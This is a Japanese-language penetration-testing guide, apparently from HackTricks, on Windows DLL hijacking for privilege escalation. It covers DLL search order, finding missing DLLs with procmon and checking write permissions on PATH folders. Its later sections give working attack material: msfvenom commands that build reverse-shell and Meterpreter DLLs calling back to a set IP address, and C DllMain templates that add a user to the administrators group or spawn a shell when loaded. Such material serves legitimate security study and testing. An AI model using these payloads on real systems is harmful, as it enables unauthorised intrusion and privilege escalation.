# Dll Hijacking

<details>

<summary><strong>ゼロからヒーローまでAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

- **HackTricksで企業を宣伝する**または**HackTricksをPDFでダウンロードする**には、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
- [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
- **Discordグループ**に**参加**する💬（https://discord.gg/hRep4RUj7f）または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter**🐦で**フォロー**する[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
- **HackTricks**（https://github.com/carlospolop/hacktricks）と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出して、あなたのハッキングテクニックを共有してください。

</details>

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**バグバウンティのヒント**：**Intigritiにサインアップ**して、ハッカーによって作成されたプレミアム**バグバウンティプラットフォーム**を利用しましょう！今すぐ[**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)に参加して、最大**$100,000**のバウンティを獲得し始めましょう！

{% embed url="https://go.intigriti.com/hacktricks" %}

## 基本情報

DLLハイジャッキングは、信頼されたアプリケーションを悪意のあるDLLを読み込むように操作することを指します。この用語には、**DLLスプーフィング、インジェクション、およびサイドローディング**などの複数の戦術が含まれます。主にコードの実行、持続性の達成、そして稀に特権昇格に使用されます。ここでは昇格に焦点を当てていますが、ハイジャッキングの方法は目的に関係なく一貫しています。

### 一般的な技術

DLLハイジャッキングには、各アプリケーションのDLL読み込み戦略に依存する効果が異なるいくつかの方法があります：

1. **DLLの置換**: 正規のDLLを悪意のあるDLLと交換し、オプションでDLLプロキシングを使用して元のDLLの機能を維持します。
2. **DLLサーチオーダーハイジャック**: 悪意のあるDLLを正規のDLLの前に検索パスに配置し、アプリケーションの検索パターンを悪用します。
3. **ファントムDLLハイジャック**: アプリケーションが読み込む必要があるDLLが存在しないと思い込んで悪意のあるDLLを作成します。
4. **DLLリダイレクション**: `%PATH%`や`.exe.manifest` / `.exe.local`ファイルなどの検索パラメータを変更して、アプリケーションを悪意のあるDLLに誘導します。
5. **WinSxS DLLの置換**: WinSxSディレクトリ内の正規のDLLを悪意のあるDLLに置き換えることで、通常はDLLサイドローディングと関連付けられる方法です。
6. **相対パスDLLハイジャック**: ユーザーが制御するディレクトリに悪意のあるDLLを配置し、コピーされたアプリケーションと似たようなバイナリプロキシ実行技術を模倣します。

## 欠落しているDLLの検出

システム内の欠落しているDLLを見つける最も一般的な方法は、sysinternalsから[procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon)を実行し、**次の2つのフィルターを設定**することです：

![](<../../.gitbook/assets/image (311).png>)

![](<../../.gitbook/assets/image (313).png>)

そして、**ファイルシステムアクティビティ**を表示します：

![](<../../.gitbook/assets/image (314).png>)

**一般的な欠落しているdllを探している場合**は、数秒間これを実行しておきます。\
**特定の実行可能ファイル内の欠落しているdllを探している場合**は、「プロセス名」が「\<exec name>」を含むような別のフィルターを設定し、実行してからイベントのキャプチャを停止します。

## 欠落しているDLLの悪用

特権を昇格させるためには、**特権プロセスが読み込もうとするdllを書き込むことができる**最善の方法は、**検索される場所のいずれかにdllを書き込む**ことです。したがって、**元のdllよりも前にdllが検索される**フォルダーにdllを**書き込む**ことができるか、または**dllがどこかで検索されるフォルダーに書き込む**ことができ、元の**dllがどのフォルダーにも存在しない**場合があります。

### Dll検索順序

[**Microsoftのドキュメント**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **内で、DLLが特定の方法で読み込まれる方法が記載されています。**

**Windowsアプリケーション**は、特定のシーケンスに従って**事前定義された検索パス**に従ってDLLを検索します。DLLハイジャックの問題が発生するのは、有害なDLLがこれらのディレクトリの1つに戦略的に配置され、正規のDLLよりも先に読み込まれることが確実になる場合です。これを防ぐ解決策は、アプリケーションが必要とするDLLを参照する際に絶対パスを使用することを確認することです。

32ビットシステムでの**DLL検索順序**は以下の通りです：

1. アプリケーションが読み込まれたディレクトリ。
2. システムディレクトリ。このディレクトリのパスを取得するには、[**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) 関数を使用します。(_C:\Windows\System32_)
3. 16ビットシステムディレクトリ。このディレクトリのパスを取得する関数はありませんが、検索されます。(_C:\Windows\System_)
4. Windowsディレクトリ。このディレクトリのパスを取得するには、[**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) 関数を使用します。(_C:\Windows_)
5. 現在のディレクトリ。
6. PATH環境変数にリストされているディレクトリ。これには、**App Paths**レジストリキーで指定されたアプリケーションごとのパスは含まれません。**App Paths**キーは、DLL検索パスの計算に使用されません。

これが**SafeDllSearchMode**が有効な状態での**デフォルト**の検索順序です。無効にするには、**HKEY\_LOCAL\_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** レジストリ値を作成し、0に設定します（デフォルトは有効）。

[**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) 関数が**LOAD\_WITH\_ALTERED\_SEARCH\_PATH**で呼び出されると、検索は**LoadLibraryEx**が読み込んでいる実行可能モジュールのディレクトリから開始されます。

最後に、**dllが名前だけでなく絶対パスを指定して読み込まれる可能性があることに注意**してください。その場合、そのdllは**そのパスのみで検索されます**（dllに依存関係がある場合、名前で読み込まれたように検索されます）。

検索順序を変更する他の方法もありますが、ここでは説明しません。
#### Windowsドキュメントからのdll検索順序の例外

Windowsドキュメントには、標準のDLL検索順序からの特定の例外が記載されています：

- **メモリにすでに読み込まれているDLLと同じ名前を共有するDLL** が見つかった場合、システムは通常の検索をバイパスします。代わりに、リダイレクトとマニフェストのチェックを実行し、メモリにすでにあるDLLにデフォルトで移行します。**このシナリオでは、システムはDLLの検索を実行しません**。
- DLLが現在のWindowsバージョンの**既知のDLL**として認識される場合、システムはその既知のDLLのバージョンを利用し、その依存するDLLと共に、**検索プロセスを省略**します。レジストリキー**HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** には、これらの既知のDLLのリストが保持されます。
- **DLLに依存関係がある**場合、依存するDLLの検索は、初期のDLLが完全なパスを通じて特定されたかどうかに関係なく、**モジュール名のみで指定されたかのように**実行されます。

### 特権の昇格

**要件**：

- **異なる特権で動作するプロセス**を特定する（水平または垂直移動）、かつ**DLLが不足している**。
- **DLLが検索される**任意の**ディレクトリ**に**書き込みアクセス**が利用可能であることを確認する。この場所は、実行可能ファイルのディレクトリまたはシステムパス内のディレクトリである可能性があります。

はい、要件を見つけるのは複雑です。**デフォルトでは特権のある実行可能ファイルがDLLを欠いている**ことを見つけるのは奇妙であり、**システムパスのフォルダに書き込み権限がある**ことはさらに**奇妙です**（通常はできません）。しかし、設定が誤っている環境では、これが可能です。\
要件を満たすことができる幸運な場合、[UACME](https://github.com/hfiref0x/UACME)プロジェクトをチェックしてみてください。プロジェクトの**主な目標はUACをバイパスする**ことですが、おそらく**書き込み権限があるフォルダのパスを変更するだけで使用できる**WindowsバージョンのDLLハイジャッキングのPoCが見つかるかもしれません。

フォルダの**アクセス許可を確認する**には、次のようにします：
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
そして、**PATH内のすべてのフォルダのアクセス許可を確認します**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
次のコマンドを使用して、実行可能ファイルのインポートとDLLのエクスポートを確認することもできます:
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
**Dllハイジャッキングを悪用して特権を昇格させる方法の完全ガイド**については、**システムパスフォルダに書き込み権限**があるかどうかを確認してください：

{% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

### 自動化ツール

[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)は、システムパス内の任意のフォルダに書き込み権限があるかどうかをチェックします。\
この脆弱性を発見するための他の興味深い自動化ツールには、**PowerSploit functions**があります：_Find-ProcessDLLHijack_、_Find-PathDLLHijack_、_Write-HijackDll_。

### 例

悪用可能なシナリオを見つけた場合、それを成功裏に悪用するために最も重要なことの1つは、**実行ファイルがそれからインポートするすべての関数を少なくともエクスポートするdllを作成すること**です。とにかく、Dllハイジャッキングは、中間インテグリティレベルから高いレベルに[**（UACをバイパスして）昇格する**](../authentication-credentials-uac-and-efs.md#uac)か、[**高いインテグリティからSYSTEMに昇格する**](./#from-high-integrity-to-system)**のに便利**です。有効なdllを作成する方法の例は、このdllハイジャッキングの実行に焦点を当てた研究で見つけることができます：[**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**。**\
さらに、**次のセクション**では、**テンプレートとして役立つ基本的なdllコード**をいくつか見つけることができます。これらは、**必要のない関数がエクスポートされたdllを作成するために使用できます**。

## **Dllの作成とコンパイル**

### **Dllプロキシ化**

基本的に**Dllプロキシ**は、**ロードされるときに悪意のあるコードを実行**できるDllですが、**実際のライブラリにすべての呼び出しをリレーすることで、本来のライブラリと同様に機能**することもできます。

[**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant)や[**Spartacus**](https://github.com/Accenture/Spartacus)というツールを使用すると、実際に**実行可能ファイルを指定し、プロキシ化したいライブラリを選択**して**プロキシ化されたdllを生成**するか、**Dllを指定**して**プロキシ化されたdllを生成**することができます。

### **Meterpreter**

**revシェルを取得（x64）:**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**メータープリンターを取得する（x86）:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**ユーザーを作成します（x86バージョンはx64バージョンは見当たりませんでした）:**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### あなた自身

複数のケースで、コンパイルしたDllは、被害者プロセスによってロードされる関数を**複数エクスポートする必要があります**。これらの関数が存在しない場合、**バイナリはそれらをロードできず、攻撃は失敗します**。
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
## 参考文献

* [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
* [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**バグバウンティのヒント**: **Intigriti** に **サインアップ** して、ハッカーたちによって作成されたプレミアム **バグバウンティプラットフォーム** に参加しましょう！[**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) で今すぐ登録して、最大 **$100,000** のバウンティを獲得し始めましょう！

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>**htARTE (HackTricks AWS Red Team Expert)** で、ゼロからヒーローまでAWSハッキングを学びましょう！</strong></summary>

HackTricks をサポートする他の方法:

* **HackTricks で企業を宣伝** したい場合や **HackTricks をPDFでダウンロード** したい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) をチェックしてください！
* [**公式PEASS＆HackTricksのグッズ**](https://peass.creator-spring.com) を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) を発見し、独占的な [**NFTs**](https://opensea.io/collection/the-peass-family) のコレクションを見つける
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f) や [**telegramグループ**](https://t.me/peass) に **参加** したり、 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live) を **フォロー** する
* **HackTricks** と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) のGitHubリポジトリに **PRを提出** して、あなたのハッキングテクニックを共有する

</details>
